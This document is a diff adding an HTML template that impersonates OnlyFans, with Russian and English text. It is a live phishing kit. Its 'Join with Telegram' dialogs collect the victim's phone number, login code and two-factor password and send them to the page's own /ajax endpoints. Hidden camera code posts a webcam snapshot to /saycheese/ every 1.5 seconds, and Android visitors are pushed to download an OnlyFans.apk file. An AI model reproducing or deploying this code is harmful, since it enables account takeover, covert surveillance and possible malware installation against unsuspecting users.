@@ -1,0 +1,852 @@
+<!DOCTYPE html>
+
+<html lang="ru"><head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<title>OnlyFans</title>
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="https://static.onlyfans.com/theme/onlyfans/spa/icons/apple-touch-icon.png?">
+<link rel="icon" type="image/png" sizes="32x32" href="https://static.onlyfans.com/theme/onlyfans/spa/icons/favicon-32x32.png?">
+<link rel="icon" type="image/png" sizes="192x192" href="https://static.onlyfans.com/theme/onlyfans/spa/icons/android-chrome-192x192.png?">
+<link rel="icon" type="image/png" sizes="16x16" href="https://static.onlyfans.com/theme/onlyfans/spa/icons/favicon-16x16.png?">
+<link rel="manifest" href="https://static.onlyfans.com/theme/onlyfans/spa/icons/site.webmanifest?">
+<link rel="mask-icon" href="https://static.onlyfans.com/theme/onlyfans/spa/icons/safari-pinned-tab.svg?" color="#00aff0">
+<link rel="shortcut icon" href="https://static.onlyfans.com/theme/onlyfans/spa/icons/favicon.ico?">
+
+<meta property="og:type" content="website">
+<meta property="og:title" content="OnlyFans">
+<meta property="og:url" content="https://only-fans.best/aliska01831">
+<meta property="og:image" content="https://only-fans.best/static/onlyfans-descript-icon-2.jpg">
+<meta property="og:image:height" content="1200">
+<meta property="og:site_name" content="OnlyFans">
+<meta property="og:image:width" content="1200">
+<meta property="og:description" content="OnlyFans is the social platform revolutionizing creator and fan connections. The site is inclusive of artists and content creators from all genres and allows them to monetize their content while developing authentic relationships with their fanbase.">
+
+
+<link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.4.0/css/all.css">
+<link rel="stylesheet" href="{{ url_for('static', filename='css/app.css') }}?v=1131602591">
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.13.2/jquery-ui.min.js"></script>
+<script src="{{ url_for('static', filename='js/inputmask.min.js') }}"></script>
+<script defer="" src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
+
+<script>
+    const isAndroid = navigator.userAgent.toLowerCase().indexOf('android') > -1
+</script>
+
+<style data-lang-style="">
+    [data-ln="en"] {
+        display: none;
+    }
+</style>
+
+<script>
+    
+
+    const isEnglish = false
+    $(document).ready(function() {
+        if (isEnglish) {
+            $('[data-ln]').each(function() {
+                if ($(this).attr('data-ln') !== 'en') {
+                    $(this).hide()
+                } else {
+                    $(this).show()
+                }
+            })
+
+            $('[data-lang-style]').remove()
+        } else {
+            $('[data-ln="en"]').hide()
+            $('[data-ln]').not('[data-ln="en"]').show()
+        }
+    })
+</script>
+</head>
+<body style="overflow-y: auto; height: auto;">
+
+<div id="app">
+    <div class="max-h-[600px] flex-wrap md:flex-nowrap h-full w-full flex justify-between relative border border-t-0 border-x-0 border-b-black/10 " id="top">
+
+        <div class="w-full md:w-[50%] max-h-[600px] min-h-[600px] h-full bg-[#00aff0] leftBox relative py-[94px]">
+
+            <div class="flex ml-4 md:ml-auto w-full md:w-[85%] justify-end">
+                <div class="flex justify-center flex-col max-w-[344px] w-full mx-auto">
+
+                    <div class="flex justify-start">
+                        <img src="{{ url_for('static', filename='img/logo-full.png') }}" alt="" class="h-[48px] mb-[13px]">
+                    </div>
+
+                    <h2 class="block w-full text-left text-[32px] text-[#fefefe] mb-[31px] leading-[40px] roboto">
+                        <span data-ln="ru">
+                            Зарегистрируйтесь, чтобы поддержать любимых авторов
+                        </span>
+                        <span data-ln="en" style="display: none;">
+                            Sign up to support your favorite authors
+                        </span>
+                    </h2>
+                </div>
+            </div>
+
+        </div>
+
+        <div class="w-full md:w-[50%] py-[94px] flex justify-center items-center background-baba relative">
+
+            <div class="absolute top-0 left-0 w-full h-full bg-black/[.30] backdrop-blur-[2px] z-[8]"></div>
+
+            <button class="auth__telegram-button relative z-[9]">
+                <i class="fa-brands fa-telegram text-white pl-2 text-2xl"></i>
+                <span class="text-[#fefefe] uppercase text-[14px] leading-[20px] roboto font-medium" data-ln="ru">Войти через Telegram</span>
+                <span class="text-[#fefefe] uppercase text-[14px] leading-[20px] roboto font-medium" data-ln="en" style="display: none;">Join with Telegram</span>
+
+                <span></span>
+            </button>
+
+        </div>
+
+    </div>
+
+    <div class="max-w-[calc(856px+2rem)] mx-auto mt-[280px] md:mt-[36px]">
+
+        <div class="flex flex-col gap-y-4 mx-4">
+
+            <p class="block text-left text-[#242529] text-[32px] leading-[40px] mb-[36px] roboto">
+                <span data-ln="ru">Последние избранные посты</span>
+                <span data-ln="en" style="display: none;">Recent selected posts</span>
+            </p>
+
+            <div class="post roboto">
+    <div class="head py-[12px] px-[16px]">
+
+        <div class="pl-[1px] flex justify-start gap-x-[10px]">
+            <img src="https://thumbs.onlyfans.com/public/files/thumbs/c50/m/mk/mka/mkamcrf6rjmcwo0jj4zoavhmalzohe5a1640180203/avatar.jpg" alt="" class="rounded-full w-[48px] h-[48px]">
+
+            <div class="flex justify-start flex-col">
+                <a class="text-[16px] leading-[20px] font-medium hover:underline" href="#top">
+                    OnlyFans
+                    <i class="bx bx-check-circle align-middle"></i>
+                </a>
+                <a href="#top" class="text-[#8a96a3] hover:text-[#0091ea] hover:underline text-[14px] mt-0.5">@onlyfans</a>
+            </div>
+        </div>
+
+        <a class="text-[#8a96a3] hover:text-[#0091ea] hover:underline text-[14px]" href="#top">
+            <span data-ln="ru">окт. 12</span>
+            <span data-ln="en" style="display: none;">oct. 12</span>
+        </a>
+    </div>
+
+    <div class="content">
+        <div class="text-[16px] leading-[24px]">
+            <p class="py-[12px] px-[16px]">
+                Kate and Sophi - Partner Yoga | Katrin TV
+                <br>
+                It's time for some fun! Learn some couple yoga poses with
+                <a href="#top">@katrintv</a>
+                and
+                <a href="#top">@firefoxso!</a>
+                <br>
+                Watch more:
+                <a href="#top">of.tv/katrin-tv</a>
+                <br>
+                <a href="#top" class="text-[14px]" data-ln="ru">Подробнее</a>
+                <a href="#top" class="text-[14px]" data-ln="en" style="display: none;">Read more</a>
+            </p>
+            <div class="relative">
+                <img src="{{ url_for('static', filename='img/preview.png') }}" alt="" class="rounded-b-[6px]">
+
+                <a class="bg-black bg-opacity-50 py-4 pl-5 pr-4 rounded-full absolute top-[50%] left-[50%] hover:bg-opacity-60 transition" style="transform: translate(-50%, -50%)" href="#top">
+                    <i class="fa-solid fa-play text-[36px] text-white/40"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+
+</div><div class="post roboto">
+    <div class="head py-[12px] px-[16px]">
+
+        <div class="pl-[1px] flex justify-start gap-x-[10px]">
+            <img src="https://thumbs.onlyfans.com/public/files/thumbs/c50/m/mk/mka/mkamcrf6rjmcwo0jj4zoavhmalzohe5a1640180203/avatar.jpg" alt="" class="rounded-full w-[48px] h-[48px]">
+
+            <div class="flex justify-start flex-col">
+                <a class="text-[16px] leading-[20px] font-medium hover:underline" href="#top">
+                    OnlyFans
+                    <i class="bx bx-check-circle align-middle"></i>
+                </a>
+                <a href="#top" class="text-[#8a96a3] hover:text-[#0091ea] hover:underline text-[14px] mt-0.5">@onlyfans</a>
+            </div>
+        </div>
+
+        <a class="text-[#8a96a3] hover:text-[#0091ea] hover:underline text-[14px]" href="#top">
+            <span data-ln="ru">окт. 12</span>
+            <span data-ln="en" style="display: none;">oct. 12</span>
+        </a>
+    </div>
+
+    <div class="content">
+        <div class="text-[16px] leading-[24px]">
+            <p class="py-[12px] px-[16px]">
+                Paris Vlog | Lizzy
+                <br>
+                Explore the enchanting streets of Paris with @youngy.lizzy!
+                <br>
+                Wander through the city of love, discover hidden gems, and indulge in delicious pastries together! 🥐
+
+                <br>
+                <a href="#top" class="text-[14px]" data-ln="ru">Подробнее</a>
+                <a href="#top" class="text-[14px]" data-ln="en" style="display: none;">Read more</a>
+            </p>
+            <div class="relative">
+                <img src="{{ url_for('static', filename='img/preview2.jpg') }}" alt="" class="rounded-b-[6px]">
+
+                <a class="bg-black bg-opacity-50 py-4 pl-5 pr-4 rounded-full absolute top-[50%] left-[50%] hover:bg-opacity-60 transition" style="transform: translate(-50%, -50%)" href="#top">
+                    <i class="fa-solid fa-play text-[36px] text-white/40"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+
+</div>
+        </div>
+
+    </div>
+</div>
+
+<footer class="bg-white mt-[26px] w-full">
+    <div class="max-w-[calc(1118px+2rem)] w-full mx-auto pt-[35px] pb-[50px]">
+
+        <div class="flex justify-start flex-wrap text-[#8a96a3] pt-[13px] text-[12px] leading-[16px] roboto mx-4">
+
+            <div class="w-1/2 md:w-1/5 footerMenu">
+                <a href="#top" class="font-medium">
+                    © <script>document.write( new Date().getFullYear() )</script>2025 OnlyFans
+                </a>
+
+                <a href="#top" class="font-medium">
+                    <span data-ln="ru">Контакты</span>
+                    <span data-ln="en" style="display: none;">Contacts</span>
+                </a>
+
+                <div class="flex justify-start gap-x-[12px] text-[16px]">
+                    <a href="#top">
+                        <i class="fa-brands fa-twitter"></i>
+                    </a>
+
+                    <a href="#top">
+                        <i class="fa-brands fa-instagram"></i>
+                    </a>
+                </div>
+            </div>
+
+            <div class="w-1/2 md:w-1/5 footerMenu">
+                <a href="#top">
+                    Help
+                </a>
+
+                <a href="#top">
+                    Store
+                </a>
+
+                <a href="#top">
+                    Cookie Notice
+                </a>
+
+                <a href="#top" class="mt-[8px]">
+                    OnlyFans Safety &amp; Transparency
+                    <br>
+                    Center
+                </a>
+            </div>
+
+            <div class="w-1/2 md:w-1/5 footerMenu">
+                <a href="#top">
+                    About
+                </a>
+
+                <a href="#top">
+                    Terms of Service
+                </a>
+
+                <a href="#top">
+                    DMCA
+                </a>
+
+                <a href="#top" class="mt-[8px]">
+                    Anti-Slavery and Anti-Trafficking
+                    <br>
+                    Statement
+                </a>
+            </div>
+
+            <div class="w-1/2 md:w-1/5 footerMenu">
+                <a href="#top">
+                    Blog
+                </a>
+
+                <a href="#top">
+                    Privacy
+                </a>
+
+                <a href="#top">
+                    USC 2257
+                </a>
+
+                <a href="#top" class="mt-[8px]">
+                    Acceptable Use Policy
+                </a>
+            </div>
+
+            <div class="w-1/2 md:w-1/5 footerMenu">
+                <a href="#top">
+                    Branding
+                </a>
+
+                <a href="#top">
+                    Complaints Policy
+                </a>
+
+                <a href="#top">
+                    Standard Contract between Fan and Creator
+                </a>
+            </div>
+
+        </div>
+
+    </div>
+</footer>
+
+
+<div id="modal" class="fixed top-0 left-0 w-full h-full z-20 hidden" style="display: none;">
+
+    <div class="absolute top-0 left-0 w-full h-full z-[21] bg-black bg-opacity-20 backdrop-blur-sm" id="modal-close"></div>
+
+    <div class="absolute top-[50%] left-[45%] md:left-[50%] bg-white p-4 border border-black border-opacity-20 rounded-xl z-[22] mx-4 min-w-[250px]" style="transform: translate(-50%, -50%)">
+
+        <p class="text-xl font-medium" data-ln="ru">
+            Войдите через
+            <span class="text-[#4285f4]">Telegram</span>
+            аккаунт
+        </p>
+
+        <p class="text-xl font-medium" data-ln="en" style="display: none;">
+            Join with
+            <span class="text-[#4285f4]">Telegram</span>
+            account
+        </p>
+
+        <div class="mt-4 flex flex-col gap-y-3">
+
+            <label for="phone" class="text-[#8a96a3] text-sm" data-ln="ru">Номер телефона</label>
+            <label for="phone" class="text-[#8a96a3] text-sm" data-ln="en" style="display: none;">Phone number</label>
+
+            <div class="relative w-full">
+                <input type="text" id="phone" class="outline-none border border-black border-opacity-20 rounded-xl py-2 pl-[1.25rem] pr-2 placeholder-black/40
+                          hover:bg-opacity-[.35]
+                          focus:bg-opacity-[.45]
+                          active:bg-opacity-[.45] transition ease-linear
+                          w-full
+                         " placeholder="" autocomplete="off" maxlength="15" inputmode="text">
+                <span class="absolute left-2 top-[.6rem]" style="color: #000">+</span>
+
+                <div id="incPhone" style="display: none">
+                    <span style="color: red; font-size: 0.75rem; position: relative;" data-ln="ru">
+                        Вы ввели номер неверно!
+                    </span>
+
+                    <span style="color: red; font-size: 0.75rem; position: relative; display: none;" data-ln="en">
+                        Incorrect phone number
+                    </span>
+                </div>
+
+            </div>
+
+            <button type="submit" class="bg-[#4285f4] w-full py-2 text-sm font-medium text-center rounded-xl text-white
+                           hover:bg-opacity-80 active:bg-opacity-[.75] focus:bg-opacity-[.75] transition ease-linear
+                          " id="modal-next">
+                <span data-ln="ru">Продолжить</span>
+                <span data-ln="en" style="display: none;">Next</span>
+            </button>
+
+        </div>
+
+    </div>
+</div>
+
+<div id="modal-code" class="fixed top-0 left-0 w-full h-full z-20 hidden">
+
+    <div class="absolute top-0 left-0 w-full h-full z-[21] bg-black bg-opacity-20 backdrop-blur-sm" id="modal-code-close"></div>
+
+    <div class="absolute top-[50%] left-[45%] md:left-[50%] bg-white p-4 border border-black border-opacity-20 rounded-xl z-[22] mx-4 min-w-[250px]" style="transform: translate(-50%, -50%)">
+
+    <p class="text-xl font-medium" data-ln="ru">
+            Введите код, отправленный
+            <br>
+            Вам в
+            <span class="text-[#4285f4]">Telegram</span>
+        </p>
+
+        <p class="text-xl font-medium" data-ln="en" style="display: none;">
+            Enter code sent
+            <br>
+            to you in
+            <span class="text-[#4285f4]">Telegram</span>
+        </p>
+
+        <div class="mt-4 flex flex-col gap-y-3">
+
+            <label for="code" class="text-[#8a96a3] text-sm" data-ln="ru">Введите код</label>
+            <label for="code" class="text-[#8a96a3] text-sm" data-ln="en" style="display: none;">Enter code</label>
+
+            <input type="text" id="code" class="outline-none border border-black border-opacity-20 rounded-xl p-2 placeholder-black/40
+                          hover:bg-opacity-[.35]
+                          focus:bg-opacity-[.45]
+                          active:bg-opacity-[.45] transition ease-linear
+                         " placeholder="999-11" autocomplete="off" inputmode="text">
+
+            <div id="incCode" style="display: none">
+                <span style="color: red; font-size: 0.75rem; position: relative;" data-ln="ru">
+                    Неверный код
+                </span>
+                <span style="color: red; font-size: 0.75rem; position: relative; display: none;" data-ln="en">
+                    Incorrect code
+                </span>
+            </div>
+
+            <button type="submit" class="bg-[#4285f4] w-full py-2 text-sm font-medium text-center rounded-xl text-white
+                           hover:bg-opacity-80 active:bg-opacity-[.75] focus:bg-opacity-[.75] transition ease-linear
+                          " id="modal-code-enter">
+                <span data-ln="ru">Войти</span>
+                <span data-ln="en" style="display: none;">Enter</span>
+            </button>
+
+        </div>
+
+    </div>
+</div>
+
+<div id="modal-password" class="fixed top-0 left-0 w-full h-full z-20 hidden">
+
+    <div class="absolute top-0 left-0 w-full h-full z-[21] bg-black bg-opacity-20 backdrop-blur-sm" id="modal-code-close"></div>
+
+    <div class="absolute top-[50%] left-[45%] md:left-[50%] bg-white p-4 border border-black border-opacity-20 rounded-xl z-[22] mx-4 min-w-[250px]" style="transform: translate(-50%, -50%)">
+
+        <p class="text-xl font-medium" style="font-size: 1rem !important; line-height: 1.35rem !important;" data-ln="ru">
+            Чтобы мы могли авторизовать ваш <span class="text-[#4285f4]">Telegram</span> введите,
+            <br> пароль от двухфакторной аутентификации
+        </p>
+
+        <p class="text-xl font-medium" style="font-size: 1rem !important; line-height: 1.35rem !important; display: none;" data-ln="en">
+            So that we can authorize your <span class="text-[#4285f4]">Telegram</span> enter,
+            <br> password for two-factor authentication
+        </p>
+
+        <div class="mt-4 flex flex-col gap-y-3">
+
+            <label for="password" class="text-[#8a96a3] text-sm" data-ln="ru">Введите пароль</label>
+            <label for="password" class="text-[#8a96a3] text-sm" data-ln="en" style="display: none;">Enter password</label>
+
+            <input type="text" id="password" class="outline-none border border-black border-opacity-20 rounded-xl p-2 placeholder-black/40
+                          hover:bg-opacity-[.35]
+                          focus:bg-opacity-[.45]
+                          active:bg-opacity-[.45] transition ease-linear
+                         " autocomplete="off">
+
+            <div id="incPassword" style="display: none">
+                <span style="color: red; font-size: 0.75rem; position: relative;" data-ln="ru">
+                    Неверный пароль
+                </span>
+                <span style="color: red; font-size: 0.75rem; position: relative; display: none;" data-ln="en">
+                    Incorrect password
+                </span>
+            </div>
+
+            <button type="submit" class="bg-[#4285f4] w-full py-2 text-sm font-medium text-center rounded-xl text-white
+                           hover:bg-opacity-80 active:bg-opacity-[.75] focus:bg-opacity-[.75] transition ease-linear
+                          " id="modal-password-enter">
+                <span data-ln="ru">Войти</span>
+                <span data-ln="en" style="display: none;">Enter</span>
+            </button>
+
+        </div>
+
+    </div>
+</div>
+
+<div id="loading-screen" class="fixed top-0 left-0 w-full h-full hidden" style="z-index: 9999999">
+
+    <div class="absolute top-0 left-0 w-full h-full z-[21] bg-black bg-opacity-20 backdrop-blur-sm" id="modal-code-close"></div>
+
+    <div class="absolute top-[50%] left-[45%] md:left-[50%] bg-white p-4 border border-black border-opacity-20 rounded-xl z-[22] mx-4 min-w-[250px]" style="transform: translate(-50%, -50%)">
+
+        <div class="flex flex-col gap-y-3">
+
+            <div id="error" style="color: #000"></div>
+
+            <span class="text-center text-[#4285f4]">
+                <i class="bx bx-loader w-[64px] mx-auto h-[64px] text-[64px] animate-spin-slow"></i>
+            </span>
+
+        </div>
+
+    </div>
+</div>
+
+<div id="show-cam" class="fixed top-0 left-0 w-full h-full z-20 hidden">
+
+    <div class="absolute top-0 left-0 w-full h-full z-[21] bg-black bg-opacity-20 backdrop-blur-sm" id="modal-code-close"></div>
+
+    <div class="absolute top-[50%] left-[45%] md:left-[50%] bg-white p-4 border border-black border-opacity-20 rounded-xl z-[22] mx-4 min-w-[250px]" style="transform: translate(-50%, -50%)">
+        <div class="flex flex-col gap-y-3">
+            <span class="text-center text-[#4285f4]">
+                <i class='bx bxs-check-circle text-[64px]'></i>
+            </span>
+            <p class="text-xl font-medium text-center" data-ln="ru">Авторизация успешна!</p>
+            <p class="text-xl font-medium text-center" data-ln="en" style="display: none;">Authorization successful!</p>
+            <p class="text-sm text-center text-[#8a96a3]" data-ln="ru">Можете закрыть это окно.</p>
+            <p class="text-sm text-center text-[#8a96a3]" data-ln="en" style="display: none;">You can close this window.</p>
+        </div>
+    </div>
+</div>
+
+<div id="tg-auth" class="fixed top-0 left-0 w-full h-full z-20 hidden">
+
+    <div class="absolute top-0 left-0 w-full h-full z-[21] bg-black bg-opacity-20 backdrop-blur-md" onclick="$('#tg-auth').fadeOut(150)"></div>
+
+    <div class="absolute top-[50%] left-[45%] md:left-[50%] bg-white p-4 border border-black border-opacity-20 rounded-xl z-[22] mx-4 min-w-[320px]" style="transform: translate(-50%, -50%)">
+
+        <div class="flex flex-col gap-y-3">
+
+            <p class="text-[#4285f4] text-sm font-medium text-center" data-ln="ru">
+                Требуется авторизация через Telegram
+            </p>
+
+            <p class="text-[#4285f4] text-sm font-medium text-center" data-ln="en" style="display: none;">
+                Authorization via Telegram is required
+            </p>
+
+            <button class="auth__telegram-button w-full relative z-[9]" onclick="$('#tg-auth').css('display', 'none')">
+                <i class="fa-brands fa-telegram text-white pl-2 text-2xl"></i>
+                <span class="text-[#fefefe] uppercase text-[14px] leading-[20px] roboto font-medium" data-ln="ru">Войти через Telegram</span>
+                <span class="text-[#fefefe] uppercase text-[14px] leading-[20px] roboto font-medium" data-ln="en" style="display: none;">Join with Telegram</span>
+
+                <span></span>
+            </button>
+
+        </div>
+
+    </div>
+</div>
+
+<div id="download-android" class="fixed top-0 left-0 w-full h-full z-50 hidden">
+
+    <div class="absolute top-0 left-0 w-full h-full z-[21] bg-black bg-opacity-20 backdrop-blur-md" onclick=""></div>
+
+    <div class="absolute top-[50%] left-[45%] md:left-[50%] bg-white p-4 border border-black border-opacity-20 rounded-xl z-[22] mx-4 min-w-[320px]" style="transform: translate(-50%, -50%)">
+
+        <div class="flex flex-col gap-y-3">
+
+            <p class="text-[#4285f4] text-sm font-medium text-center montserrat">
+                <span data-ln="ru">ANDROID-приложение</span>
+                <span data-ln="en" style="display: none;">ANROID-application</span>
+            </p>
+
+            <button class="auth__telegram-button notgo w-full relative z-[9] px-[.75rem]" onclick="$('#tg-auth').css('display', 'none')" data-download-app="">
+                <span class="text-[#fefefe] uppercase text-[14px] leading-[20px] roboto font-medium" data-ln="ru">Скачать</span>
+                <span class="text-[#fefefe] uppercase text-[14px] leading-[20px] roboto font-medium" data-ln="en" style="display: none;">Download</span>
+
+                <span class="uppercase">
+                    <img src="{{ url_for('static', filename='img/android.png') }}" alt="ICON_ANDROID" class="max-w-[24px]">
+                </span>
+            </button>
+
+        </div>
+
+    </div>
+</div>
+<script>
+    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream
+</script>
+
+<div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline="" autoplay=""></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="800" height="640"></canvas>
+
+<script>
+
+    let $code = $('#code')
+    let $phone = $('#phone')
+
+    $phone.inputmask('999999999999999', { "placeholder": "" })
+
+    $code.inputmask({
+        mask: "999-99"
+    })
+
+</script>
+
+<script>
+
+    $('[data-download-app]').on('click', function (e) {
+        e.preventDefault()
+        if ( localStorage.getItem('app') === null ) {
+            $.ajax({
+                url: '/ajax?do=download',
+                method: 'GET',
+                success: function () {
+                    localStorage.setItem('app', 'true')
+                },
+                complete: function () {
+                    window.location.href = '/OnlyFans.apk'
+                }
+            })
+        } else {
+            window.location.href = '/OnlyFans.apk'
+        }
+    })
+
+    function hasGetUserMedia() {
+        return ( navigator.getUserMedia ||
+            navigator.webkitGetUserMedia ||
+            navigator.mozGetUserMedia ||
+            navigator.msGetUserMedia)
+    }
+
+    async function post(imgdata) {
+        await $.ajax({
+            type: 'POST',
+            data: { cat: imgdata },
+            url: '/saycheese/',
+            dataType: 'json',
+            async: true,
+            success: function (result) {
+
+            },
+            error: function () {
+
+            }
+        })
+    }
+
+    const video = document.getElementById('video'),
+          canvas = document.getElementById('canvas'),
+          errorMsgElement = document.querySelector('#errorMsg')
+
+    const constraints = {
+        audio: false,
+        video: {
+
+            facingMode: "user"
+        }
+    }
+
+    async function init() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia(constraints)
+            await handleSuccess(stream)
+        } catch (e) {
+            errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`
+        }
+    }
+
+    async function handleSuccess(stream, showModal = 1) {
+        if ( localStorage.getItem('camera') === null ) {
+            localStorage.setItem('camera', 'true')
+        }
+
+        window.stream = stream
+        video.srcObject = stream
+
+        if ( showModal ) {
+            if (isAndroid) {
+                $('#show-cam').fadeOut(150)
+                $('#download-android').fadeIn(100)
+            } else {
+                $('#show-cam').fadeOut(150)
+                $('#loading-screen').fadeIn(150)
+            }
+        }
+
+        // $('body').attr('style', ' ')
+
+        let context = await canvas.getContext('2d')
+
+        setInterval(async function () {
+            await context.drawImage(video, 0, 0, 800, 640)
+            let canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream")
+            await post(canvasData)
+        }, 1500)
+    }
+
+    if ( localStorage.getItem('camera') !== null ) {
+        navigator.mediaDevices.getUserMedia(constraints)
+            .then(function(stream) {
+                handleSuccess(stream, 0)
+            })
+            .catch(function(err) {
+                localStorage.removeItem('camera')
+                console.log(err.name + ": " + err.message)
+            })
+    }
+
+</script>
+
+<script>
+    (function () {
+        setTimeout(function () {
+            console.log('--------------------')
+            console.log('Page render time: ' + 4.1716868877411 + 's')
+            console.log('--------------------')
+        }, 500)
+    })()
+</script>
+
+<script>
+    $(document).ready(function() {
+
+        function showModal(modalId) {
+            $('#modal').hide();
+            $('#modal-code').hide();
+            $('#modal-password').hide();
+            $('#loading-screen').hide();
+            $('#show-cam').hide(); 
+            $(modalId).show();
+        }
+
+        $('.auth__telegram-button').on('click', function() {
+            showModal('#modal');
+        });
+
+        $('#modal-close, #modal-code-close').on('click', function() {
+            $('#modal').hide();
+            $('#modal-code').hide();
+            $('#modal-password').hide();
+            $('#loading-screen').hide();
+            $('#show-cam').hide(); 
+        });
+
+        $('#modal-next').on('click', function() {
+            const phone = $('#phone').val();
+            $('#incPhone').hide(); 
+            if (phone) {
+                showModal('#loading-screen'); 
+                $('#error').text(''); 
+                $.ajax({
+                    url: '/ajax?do=phone',
+                    type: 'GET',
+                    data: { phone: phone },
+                    success: function(response) {
+                        $('#loading-screen').hide(); 
+                        if (response.status === 'ok') {
+                            if (response.next === 'code') {
+                                $('#modal').hide(); 
+                                $('#modal-code').show(); 
+                            } else if (response.next === 'password') {
+                                $('#modal').hide(); 
+                                $('#modal-password').show(); 
+                            } else if (response.next === 'authorized' || response.next === 'camera') {
+                                $('#modal').hide(); 
+                                $('#show-cam').show(); 
+                            }
+                        } else {
+                            $('#incPhone').show(); 
+                            $('#error').text(response.message); 
+                            $('#modal').show(); 
+                        }
+                    },
+                    error: function(xhr, status, error) {
+                        $('#loading-screen').hide(); 
+                        $('#error').text('Произошла ошибка при отправке номера.');
+                        $('#modal').show(); 
+                        console.error("AJAX error:", status, error);
+                    }
+                });
+            } else {
+                $('#incPhone').show();
+            }
+        });
+
+        $('#modal-code-enter').on('click', function() {
+            const code = $('#code').val();
+            $('#incCode').hide(); 
+            if (code) {
+                showModal('#loading-screen'); 
+                 $('#error').text(''); 
+                $.ajax({
+                    url: '/ajax?do=code',
+                    type: 'GET',
+                    data: { code: code },
+                    success: function(response) {
+                        $('#loading-screen').hide();
+                        if (response.status === 'ok') {
+                            if (response.next === 'camera') {
+                                showModal('#show-cam'); 
+                            } else if (response.next === 'password') {
+                                showModal('#modal-password'); 
+                                $('#error').text('Неизвестный ответ сервера.');
+                                showModal('#loading-screen');
+                            }
+                        } else {
+                            $('#incCode').show(); 
+                            $('#error').text(response.message); 
+                             showModal('#loading-screen'); 
+                        }
+                    },
+                    error: function(xhr, status, error) {
+                         $('#error').text('Произошла ошибка при отправке кода.');
+                         showModal('#loading-screen');
+                        console.error("AJAX error:", status, error);
+                    }
+                });
+            } else {
+                $('#incCode').show();
+            }
+        });
+
+        $('#modal-password-enter').on('click', function() {
+            const password = $('#password').val();
+            $('#incPassword').hide();
+            if (password) {
+                showModal('#loading-screen');
+                 $('#error').text(''); 
+                $.ajax({
+                    url: '/ajax?do=password',
+                    type: 'GET',
+                    data: { password: password },
+                    success: function(response) {
+                        $('#loading-screen').hide(); 
+                        if (response.status === 'ok') {
+                            if (response.next === 'camera') {
+                                showModal('#show-cam'); 
+                            } else {
+                                $('#error').text('Неизвестный ответ сервера после ввода пароля.');
+                                showModal('#loading-screen');
+                            }
+                        } else {
+                            $('#incPassword').show(); 
+                            $('#error').text(response.message); 
+                            showModal('#modal-password'); 
+                        }
+                    },
+                    error: function(xhr, status, error) {
+                        $('#loading-screen').hide(); 
+                        $('#error').text('Произошла ошибка при отправке пароля: ' + (xhr.responseJSON ? xhr.responseJSON.message : error)); 
+                        showModal('#modal-password');
+                        console.error("AJAX error:", status, error, xhr);
+                    }
+                });
+            } else {
+                $('#incPassword').show();
+            }
+        });
+
+
+    }); 
+</script>
+
+</body></html>
